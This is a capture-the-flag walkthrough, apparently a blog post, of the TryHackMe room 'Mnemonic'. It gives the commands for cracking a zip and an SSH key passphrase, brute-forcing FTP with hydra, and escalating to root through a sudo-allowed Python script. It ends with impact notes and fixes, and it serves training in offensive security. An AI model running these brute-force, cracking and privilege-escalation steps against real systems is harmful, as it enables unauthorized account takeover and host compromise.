@@ -1,0 +1,143 @@
+---
+title: 'Mnemonic'
+description: 'A password-protected backup zip leads through cracked FTP creds to an SSH key, whose passphrase decrypts a custom image-based cipher to recover a user password, ending in a sudo-allowed Python script whose hidden input path spawns a root shell.'
+date: 2026-02-25
+platform: tryhackme
+room: 'Mnemonic'
+roomUrl: 'https://tryhackme.com/room/mnemonic'
+difficulty: medium
+tags:
+  - 'web'
+  - 'ftp'
+  - 'password-cracking'
+  - 'crypto'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'weak credentials'
+  - 'insecure command execution'
+  - 'insecure sudo configuration'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Mnemonic" room from TryHackMe. It's a breadcrumb chain: a crackable backup zip leaks an FTP username, FTP hands over an SSH key, the key's passphrase gets us in as_ _`james`\*\*, a custom image-based cipher decrypts the next user's password, and a_ _`sudo`\*\*-allowed Python script with a hidden input path hands over root._
+
+> Mnemonic is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. Flags and every recovered password are shown as `THM{<redacted>}` / `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+`robots.txt` points to `/webmasters`, which hides `/backups/backups.zip` → crack the zip (`fcrackzip`) to read a note naming FTP user `ftpuser` → brute FTP (`hydra`) → FTP dir `data-4` holds `james`'s `id_rsa` → crack the key passphrase (`ssh2john` + `john`) and SSH in as **james** → james's home has an image URL and a number file for a **custom “Mnemonic” image-based cipher**; running the tool decrypts **condor**'s password → SSH as condor → `sudo -l` allows `python3 /bin/examplecode.py`, whose quit prompt secretly runs input as root → **root** (root flag).
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap`/`rustscan` shows FTP, a web server (with `/webmasters/*` disallowed in robots), and SSH on a non-standard port:
+
+```text
+21/tcp   open  ftp   vsftpd 3.0.3
+80/tcp   open  http  Apache 2.4.29   # robots.txt disallows /webmasters/*
+1337/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
+```
+
+### **The vulnerability**
+
+Mnemonic has no single flashy bug — it's a chain of weak secrets: a zip you can crack, an FTP password in rockyou, an SSH key with a weak passphrase, and a home-grown cipher protecting the next credential. The privesc is a classic: a `sudo`-whitelisted script with a code path that executes user input as root.
+
+<Callout type="insight">
+
+The standout is the **custom image-based cipher**. `james`'s home leaves two breadcrumbs — a YouTube thumbnail URL (base64-encoded as a directory name) and a file of big integers (`6450.txt`). The “Mnemonic” tool (its author is named in a note) uses the _image_ as the key to decode the number file back into plaintext: condor's password. Rolling your own crypto means anyone who finds the key material (here, a public image) can reverse it.
+
+</Callout>
+
+### **Step 1 — crack the backup zip → FTP user**
+
+`/webmasters` enumerates to `/backups/backups.zip`. Crack it and read the note:
+
+```text
+fcrackzip -D -p rockyou.txt -u backups.zip   # PASSWORD FOUND: <redacted>
+unzip backups.zip && cat backups/note.txt
+# James new ftp username: ftpuser
+```
+
+### **Step 2 — brute FTP → steal james's SSH key**
+
+```text
+hydra -l ftpuser -P rockyou.txt ftp://$IP      # ftpuser : <redacted>
+ftp -A $IP   # browse data-1 .. data-10; data-4 has id_rsa + not.txt
+```
+
+`data-4/id_rsa` is `james`'s private key (and `not.txt` hints the FTP password changes — the key is the way in).
+
+### **Step 3 — crack the key passphrase → SSH as james**
+
+```text
+ssh2john id_rsa > hash_rsa.txt
+john --wordlist=rockyou.txt hash_rsa.txt   # passphrase: <redacted>
+ssh -i id_rsa james@$IP -p 1337
+```
+
+`james`'s home leaves the cipher breadcrumbs: a note crediting a “Mnemonic” image cipher, a number file (`6450.txt`), and — under `condor`'s home — base64 directory names decoding to a flag and to a public image URL (the key).
+
+### **Step 4 — decrypt the image cipher → condor's password**
+
+Clone the Mnemonic tool, feed it the downloaded image as the key and `6450.txt` as the ciphertext, and choose decrypt:
+
+```text
+# python3 Mnemonic.py  -> image key + 6450.txt -> decrypts condor's password: <redacted>
+ssh condor@$IP -p 1337
+```
+
+### **Step 5 — sudo script hidden path → root (root flag)**
+
+`condor` may run one script as root:
+
+```text
+condor@mnemonic:~$ sudo -l
+# (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
+```
+
+Reading `/bin/examplecode.py`, the menu's quit prompt doesn't just exit: entering `.` makes it run whatever you type **as root**. So pick the exit option, answer `.`, and run commands as root:
+
+```text
+sudo /usr/bin/python3 /bin/examplecode.py
+# Select: 0
+# are you sure you want to quit ? yes : .
+# (now root) -> cat /root/root.txt -> THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 \~8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). A chain of weak secrets (crackable zip, rockyou FTP password, weak SSH-key passphrase) plus a home-grown cipher protected only by a public image gives sequential account takeover up to `condor`. A `sudo`-whitelisted script that executes user input as root then yields full root — complete host compromise.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Strong, unique secrets everywhere:** a zip password, FTP password and SSH-key passphrase that survive rockyou; don't stash private keys on FTP.
+- **Don't roll your own crypto.** A cipher keyed on a guessable/public image protects nothing; use vetted algorithms and real key management.
+- **Fix the sudo script.** A root-run helper must never `eval`/`exec`/`os.system` on user input, and sudo should whitelist specific safe actions, not an interactive script.
+
+</Callout>
+
+### **Takeaways**
+
+- **Breadcrumb boxes reward patience** — each weak secret unlocks the key material for the next.
+- **“Custom encryption” is a red flag, not a feature.** If the key is a public image, decryption is just following instructions.
+- **Audit** **`sudo -l`** **scripts for hidden input paths.** A menu that secretly runs your text as root is a one-line privesc.
+
+Mnemonic is a tidy lesson in how a trail of individually-small weaknesses adds up to root. Thanks for reading.
